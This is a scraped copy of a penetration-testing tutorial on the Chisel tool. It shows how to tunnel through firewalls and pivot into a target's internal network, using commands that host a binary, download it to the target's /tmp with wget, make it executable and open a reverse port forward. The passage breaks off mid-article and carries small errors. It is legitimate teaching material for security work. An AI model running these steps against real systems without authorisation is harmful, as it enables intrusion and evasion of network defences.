---
title: A Detailed Guide on Chisel
url: https://buaq.net/go-155230.html
source: unSafe.sh - 不安全
date: 2023-03-26
fetch_date: 2025-10-04T10:42:23.145080
---

# A Detailed Guide on Chisel

* [unSafe.sh - дёҚе®үе…Ё](https://unsafe.sh)
* [жҲ‘зҡ„ж”¶и—Ҹ](/user/collects)
* [д»Ҡж—ҘзғӯжҰң](/?hot=true)
* [е…¬дј—еҸ·ж–Үз«](/?gzh=true)
* [еҜјиҲӘ](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [зј–з Ғ/и§Јз Ғ](/encode)
* [ж–Үд»¶дј иҫ“](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
й»‘еӨңжЁЎејҸ

![](https://8aqnet.cdn.bcebos.com/e71e00e1de69158c3417d18229fb6c0a.jpg)

A Detailed Guide on Chisel

Background of Port forwardingPort forwarding in a computer network, also known as
*2023-3-25 18:18:23
Author: [www.hackingarticles.in(жҹҘзңӢеҺҹж–Ү)](/jump-155230.htm)
йҳ…иҜ»йҮҸ:78
ж”¶и—Ҹ*

---

### Background of Port forwarding

Port forwarding in a computer network, also known as port mapping of network address transition (NAT), redirects a communication request from one address and port number combination to another while packets traverse a network gateway such as a firewall or a router. It is used to keep unwanted traffic off. A network administrator uses one IP address for all external communications on the internet while dedicating multiple servers with different IPS and ports internally to do various tasks based on organization requirements.

### Table of content

* Introduction to Chisel
* Establish a connection with the remote host
* Local port forwarding Example вҖ“ 1
* Local Port forwarding Example вҖ“ 2
* Establish Connection with SOCKS5 Proxy
* Configure SOCKS5 in proxychains4.conf file
* Banner grabbing of the remote host with proxychains
* Telnet Connection using proxychains
* FTP connection using proxychains
* VNC Viewer connection using proxychains
* Conclusion

### Introduction to Chisel

Chisel is open-sourced tool written in Go (Golang) language, mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. It is a fast TCP/UDP tunnel, transported over HTTP and secured via SSH. In addition, it requires two things to establish a connection between a remote host and the attacking box, where the attacking box will act as the server and the remote host as a client.

### Establish a connection with the remote host

We are establishing a connection with the remote host with valid credentials. The remote host can be a target and tunneling point for the next hop. If there is another hop we can connect with, then the remote host will act as a routing point. We connected as the **pentest** user with the host using SSH protocol which stands for secure socket shell and transmits data in encrypted form. Once we connect with the remote host, we will view the internal network status, which can be achieved using the following commands.

-a all interface

-n show ip address

-t show tcp connections

-p show process id/name

```
ssh [emailВ protected]
netstat -antp
```

### ![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsfONWd3XCtaSiASU7ZqQ6Bp1NN3DPCp5UIwhslLXRuppOgCrjnj19r2g8ja0MWPgqZnp1a89lO33n4r0OczaSN17JI7ePGEiUIj-V332kQ7TwQS8nQjyyE7QAEh5rV4TalPr0AZ6jpJnGlH7izyPyf7TKSZTbgOzBTV-VndwVsV2Dt1b0KowYSQ2SXQ/s16000/1.png?w=640&ssl=1)

### Installation

Chisel installation is straightforward in Kali Linux as it comes with a distribution package. We can install it using the below command.

```
apt install chisel
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8ewRwLH_EJQnTTxkdn2-5PaN1TmGbuMMBoD-HmvJdP2rhe7dwBjiIvzaTDco948tueK3LBmuHMtgnz4h69HDXVqMQy7Humg0z9uA1WrfLwW_DFUEkHRhYrbvCBFDw1eHgKJZohSid6vQjosPqRBWHUmDXfAUVcYbL8qF7obZrBHWbt91bTOr3K9BodA/s16000/2.png?w=640&ssl=1)

### Local port forwarding Example вҖ“ 1

In reverse port forwarding, it allows connecting to remote services hosted in an internal network. Here we are using a chisel utility to achieve our goal. It will require you to go through multiple steps. In the first step, we set up a reverse server in our base machine (Kali) by specifying a port number of 5000.

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiStySIg2yNgPuf7HzAfiNCM6pn6m7BzmTKkjPAjPFDHIfP7iiK4tq7W01K2TzAbt6H7lgnOcoF6244s9hs9i3XhtGlxHt3Iusyza1pgyFiZVulKQULRo0ICzJqexJ3h4sXl1TRsxwB1JOuhm3dWTV9m3-DUXzsuik6pLNt9tdO61M-bDFL5YvJ26odYg/s16000/3.png?w=640&ssl=1)

Once our Chisel server is ready and reverse tunneling is enabled, we will be required to transfer a chisel binary to the remote host. The chisel binaries can be downloaded from the official repository based on the system architecture. All the latest available binaries can be found by accessing the releases tab. As we will test it on a Linux system with AMD64 architecture, we selected the highlighted one.

Download link: **<https://github.com/jpillora/chisel/releases>**

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEithVHBbhdyrAvfL2gr0Zr9tiNcl08i-sK9oeNa9Z1y4pqdOfqEIaBnmHPvY2ID06fpSL4uru0pOkXSLGarpTVSKNv6L-oJYPpQknUpk-Cb_GS1nE2BnE-UaIJoiff7CqIFTrPF6un4RBe3QaX1Bcq38MqjQLcPgg80tHWGNlCWMwqNMR4FOMaMy9e_Cw/s16000/4.png?w=640&ssl=1)

After cloning the repository, it will be saved in the downloads folder in zip file format. Next, we will unzip the file using **the gunzip** utility. As mentioned earlier, we require to transfer it to the target system to set up a chisel as a client. To transfer the file, we set up a python server in our local system, which will host our file on port 80.

```
gitclone https://github.com/jpillora/chisel.git
gunzip chisel_1.7.7_linux_amd64.gz
python3 -m http.server 80
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW5uurS4bO12NvQPalYP7sbcvbBGKt6_vy0Nnl63K26sP4g5egBdPn8pfE4CmEzQXQZOuPkVatOCP1-iHVWvlKYjE3bhUnl89ebeN5gHIMfV0ouEc1qXljH816rF2bzCBN6NUF_Vd4o1spaUcCpZPHOgJIzF8JUFZttEzWkUJ3gvpIhuYjBi0ew3Uw3g/s16000/6.png?w=640&ssl=1)

We downloaded the chisel binary in the remote hostвҖҷs **/tmp** directory, where everyone has full permission on files. Then we give full permission to file so we can execute it. Suppose we do not give appropriate permission to file. In that case, we cannot execute it as it is set only to read permission when we download anything in the temp directory as a low-privileged user. To establish a remote connection, we require a chisel server and a chisel client where the chisel server is the Attacking box, and the chisel server will be the target machine. As we have already set up a chisel server on **port 5000** earlier, we are establishing a connection with the server. In this example, we mentioned chisel as a client and gave the server IP address and port number (**5000**). We then mentioned an accessing port (**4444**) and localhost with a port where HTTP service is hosted internally in the remote system.

```
wget 192.168.1.205/ chisel_1.7.7_linux_amd64
chmod 777 chisel_1.7.7_linux_amd64
./chisel_1.7.7_linux_amd64 client 192.168.68.141:5000 R:4444:localhost:8080
```

**![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXBQ0-pIZHHSTazXNV8IraqUdTcrVfimbl97UlITQ82i9GaQX7n0_EhA2QGnXoWc7H8qEx7WV3H5GHCeQF0eWfXtAPWfQu9hA0SBJlUvLBKBHmyiLn6w4dOOZhhAPGjUrouogitnZ4Ck2qsk4-xKWYXV5ThI934F9Ac5VSKzTwQziW2gS8GLVHyynxbQ/s16000/7.png?w=640&ssl=1)**

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilHbxELY_FVcEjHgzEx47wwB3GWxbsFFssJV8ePMEkFKexlRXYmBpRhZkh1-Sr2CLhYqvdbhs0A3k2a_ZFVaL49r5KllrOxS9PtdNP2o5V3ubfrRfyDFqd4ccUW5NX_z_PNiNZ2g7CgTd2NU-pFp7q1TfLnG0TZXVIf6bdl1Ft2nTwf8UkMO13e8AISA/s16000/8.png?w=640&ssl=1)

### Local Port forwarding Example вҖ“ 2

There is another way to access the HTTP service using the attackerвҖҷs IP address instead of the loopback interface this time. We will be required to install a chisel in the target machine to achieve the goal. In this example, we are using the ubuntu system. As the chisel is written in Golang language, we need to install Golang in the target system using the below command.

```
apt install golang
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2x...